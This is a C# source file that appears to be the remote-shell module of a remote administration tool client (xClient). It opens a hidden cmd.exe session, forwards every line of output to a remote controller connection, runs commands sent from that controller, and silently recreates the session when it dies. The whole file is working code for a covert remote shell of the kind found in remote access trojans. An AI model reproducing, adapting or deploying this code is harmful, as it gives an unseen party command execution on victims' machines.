using System;
using System.Diagnostics;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core.RemoteShell
{
    public class Shell
    {
        private Process _prc;
        private bool _read;

        public Shell()
        {
            _read = true;
            CreateSession();
        }

        private void CreateSession()
        {
            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = @"C:\",
                    Arguments = "/K"
                }
            };

            _prc.Start();
            new ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program.ConnectClient);

            new Thread(Redirect).Start();
        }

        private void Redirect()
        {
            try
            {
                using (var reader = _prc.StandardOutput)
                {
                    while (!reader.EndOfStream && _read)
                    {
                        var read = reader.ReadLine();
                        if (read == null) continue;
                        Thread.Sleep(200);
                        new ShellCommandResponse(read + Environment.NewLine).Execute(Program.ConnectClient);
                    }
                }

                if ((_prc == null || _prc.HasExited) && _read)
                    throw new ApplicationException("session unexpectedly closed");
            }
            catch (ApplicationException)
            {
                new ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine).Execute(
                    Program.ConnectClient);
                CreateSession();
            }
        }

        public bool ExecuteCommand(string command)
        {
            if (_prc.HasExited)
                return false;

            _prc.StandardInput.WriteLine(command);
            _prc.StandardInput.Flush();

            return true;
        }

        ~Shell()
        {
            _read = false;
            try
            {
                if (_prc != null && !_prc.HasExited)
                {
                    _prc.Kill();
                    _prc.Dispose();
                    _prc = null;
                    new ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                }
            }
            catch
            {
            }
        }

        public void CloseSession()
        {
            _read = false;
            try
            {
                if (_prc != null && !_prc.HasExited)
                {
                    _prc.Kill();
                    _prc.Dispose();
                    _prc = null;
                    new ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
                }

                // The session has already been closed, so there is no reason to make
                // the garbage collector waste lots of time finalizing it.
                GC.SuppressFinalize(this);
            }
            catch
            {
            }
        }
    }
}